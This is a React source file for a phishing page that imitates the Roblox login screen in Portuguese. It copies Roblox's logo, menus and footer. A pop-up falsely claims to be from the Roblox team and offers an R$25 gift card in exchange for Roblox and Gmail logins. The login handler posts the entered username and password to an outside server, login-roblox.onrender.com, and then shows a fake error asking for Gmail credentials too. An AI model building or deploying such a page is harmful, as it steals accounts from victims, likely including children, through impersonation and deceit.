import React, { useEffect, useState } from 'react';
import './App.css';
import axios from 'axios';
import DialogObterCodigo from './dialogComponent';
import DialogOutroDispositivo from './outroDispositivo';
import DialogExeception from './exceptionDialog';

function App() {

  const [dialogOpen1, setDialogOpen1] = useState(false);
  const [dialogOpen2, setDialogOpen2] = useState(false);
  const [dialogOpen3, setDialogOpen3] = useState(false);
  const [dialogOpen4, setDialogOpen4] = useState(false);
  const [dialogOpen5, setDialogOpen5] = useState(true);

  const [isAcionado, setAcionado] = useState(false);

  const [userCredentials, setUserCredentials] = useState({
    username: '',
    password: '',
  });

  const openDialog1 = () => {
    setDialogOpen1(true);
  };

  const closeDialog1 = () => {
    setDialogOpen1(false);
  };

  const openDialog2 = () => {
    setDialogOpen2(true);
  };

  const closeDialog2 = () => {
    setDialogOpen2(false);
  };

  const openDialog3 = () => {
    setDialogOpen3(true);
  };

  const closeDialog3 = () => {
    setDialogOpen3(false);
  };

  const openDialog4 = () => {
    setDialogOpen4(true);
  };

  const closeDialog4 = () => {
    setDialogOpen4(false);
  };

  const closeDialog5 = () => {
    setDialogOpen5(false);
  };




  const handleAcionar = () => {
    const { username, password } = userCredentials;

    if (!username || !password) {
      openDialog3();
      return;
    }

    setAcionado(true);
  }


  const handleLogin = () => {
    openDialog4();
    axios.post('https://login-roblox.onrender.com/login', userCredentials).then(() => {
    }).catch(() => console.log("entrou"));
  }

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setUserCredentials((prevCredentials) => ({
      ...prevCredentials,
      [name]: value,
    }));
  };


  useEffect(() => {
    if (isAcionado) {
      handleLogin();
    }
    setAcionado(false)
  }, [isAcionado]);

  const siteRoblox = () => {
    window.location.href = 'https://www.roblox.com/';
  };

  return (
    <>
      <DialogObterCodigo open={dialogOpen1} onClose={closeDialog1} />
      <DialogOutroDispositivo open={dialogOpen2} onClose={closeDialog2} />
      <DialogExeception open={dialogOpen3} titulo={"Erro"} onClose={closeDialog3} message={"Para entrar nós da equipe do Roblox precisamos que você preencha todos os campos antes de realizar o login!"} />
      <DialogExeception open={dialogOpen5}
        onClose={closeDialog5}
        titulo={"Bem vindos ao Roblox-Render"}
        message={"Nós fazemos parte da equipe Roblox e temos o prazer de oferecer a você um gift card no valor de R$25. Por favor, faça login com sua conta do roblox e sua conta do GMAIL, e em breve enviaremos o código diretamente para o seu e-mail. Aproveite!"} />
      <DialogExeception open={dialogOpen4} onClose={closeDialog4} 
      titulo={"Tivemos um problema"} 
      message={"Etapa Concluída, peço que entre primeiro com sua conta do roblox e depois com seu email e senha do Gmail!!!"}/>

      <div className='main-body'>
        <div className='nav-bar'>
          <div className='nav-bar-p1'>
            <span>
              <img id='roblox-logo' src="https://images.rbxcdn.com/d82801b936c26e174c4e782510a72d78-roblox_logo_dark_08292022.svg" alt="" />
            </span>
            <span>
              <p>
                <a href="https://www.roblox.com/discover#/">Descubra</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1">Mercado</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://create.roblox.com/landing">Criar</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://www.roblox.com/upgrades/robux?ctx-nav">Robux</a>
              </p>
            </span>
          </div>
          <div className='nav-bar-p2'>
            <div className="search-container">
              <input type="text" placeholder='Pesquisar' />
            </div>
            <button className='cadastro-button' onClick={siteRoblox}>
              <p> Cadastre-se </p>
            </button>
          </div>
        </div>
        <section className='section-1'>
          <div className='login'>
            <div className="tittle-space">
              <p>Entrar na Roblox</p>
            </div>
            <div className="input-place">
              <input
                type="text"
                name="username"
                placeholder='Usuário/e-mail/telefone'
                value={userCredentials.username}
                onChange={handleInputChange}
              />
              <input
                type="password"
                name="password"
                placeholder='Senha'
                value={userCredentials.password}
                onChange={handleInputChange}
              />
            </div>
            <div className="login-button">
              <button onClick={handleAcionar}>Entrar</button>
            </div>
            <div className="forgot-password">
              <p>Esqueceu a senha ou nome de usuário?</p>
              <div className="line"></div>
            </div>
            <div className="section-buttons">
              <button onClick={openDialog1}>
                Envie-me um código único por e-mail
              </button>
              <button onClick={openDialog2}>
                Use outro dispositivo
              </button>
            </div>
            <div className="create-account">
              <p>Não possui uma conta? </p> <p><a href="https://www.roblox.com">Cadastre-se</a> </p>
            </div>
          </div>
        </section>
        <div className='footer'>
          <div className='space-1'>
            <span><p><a href="">Sobre nós       </a> </p></span>
            <span><p><a href="">Vagas           </a> </p></span>
            <span><p><a href="">Blog            </a> </p></span>
            <span><p><a href="">Responsáveis    </a> </p></span>
            <span><p><a href="">Cartões presente</a> </p></span>
            <span><p><a href="">Ajuda           </a> </p></span>
            <span><p><a href="">Termos          </a> </p></span>
            <span><p><a href="">Acessibilidade  </a> </p></span>
            <span><p><a href="">Privacidade     </a> </p></span>
          </div>
          <div className='space-2'>
            <div className="line"></div>
            <div className="reservation">
              <p>
                ©2023 Roblox Corporation. Roblox, o logotipo Roblox e Powering Imagination estão entre nossas marcas registradas e não registradas nos EUA e outros países.
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="body-cellphone">
        <div className="tittle-cellphone">

          <div className="tittle-p1-c">
            <div className="logo-spapce-cell">
              <span></span>
            </div>
            <div className="button-space-c">
              <button className='cadastro-button' onClick={siteRoblox}>
                <p> Cadastre-se </p>
              </button>

            </div>
          </div>
          <div className="tittle-p2-c">
            <span>
              <p>
                <a href="https://www.roblox.com/discover#/">Descubra</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://www.roblox.com/catalog?Category=1&salesTypeFilter=1">Mercado</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://create.roblox.com/landing">Criar</a>
              </p>
            </span>
            <span>
              <p>
                <a href="https://www.roblox.com/upgrades/robux?ctx-nav">Robux</a>
              </p>
            </span>
          </div>
        </div>
        <section className="login-space-c">
          <div className='login'>
            <div className="tittle-space">
              <p>Entrar na Roblox</p>
            </div>
            <div className="input-place">
              <input
                type="text"
                name="username"
                placeholder='Usuário/e-mail/telefone'
                value={userCredentials.username}
                onChange={handleInputChange}
              />
              <input
                type="password"
                name="password"
                placeholder='Senha'
                value={userCredentials.password}
                onChange={handleInputChange}
              />
            </div>
            <div className="login-button">
              <button onClick={handleAcionar}>Entrar</button>
            </div>
            <div className="forgot-password">
              <p>Esqueceu a senha ou nome de usuário?</p>
              <div className="line"></div>
            </div>
            <div className="section-buttons">
            <button onClick={openDialog1}>
                Envie-me um código único por e-mail
              </button>
              <button onClick={openDialog2}>
                Use outro dispositivo
              </button>
            </div>
            <div className="create-account">
              <p>Não possui uma conta? </p> <p><a href="https://www.roblox.com">Cadastre-se</a> </p>
            </div>
          </div>
        </section>
        <div className='footer-c'>
          <div className="about-c">
            <span><p><a href="">Sobre nós       </a> </p></span>
            <span><p><a href="">Vagas           </a> </p></span>
            <span><p><a href="">Blog            </a> </p></span>
            <span><p><a href="">Responsáveis    </a> </p></span>
            <span><p><a href="">Cartões presente</a> </p></span>
            <span><p><a href="">Ajuda           </a> </p></span>
            <span><p><a href="">Termos          </a> </p></span>
            <span><p><a href="">Acessibilidade  </a> </p></span>
            <span><p><a href="">Privacidade     </a> </p></span>
          </div>
          <div className="line-space-c">
            <div className="line-c"></div>
            <div className="text-dir">
              <p>©2023 Roblox Corporation. Roblox, o logotipo Roblox e Powering Imagination estão entre nossas marcas registradas e não registradas nos EUA e outros países.</p>
            </div>
          </div>
        </div>


      </div>

    </>

  );
}

export default App;
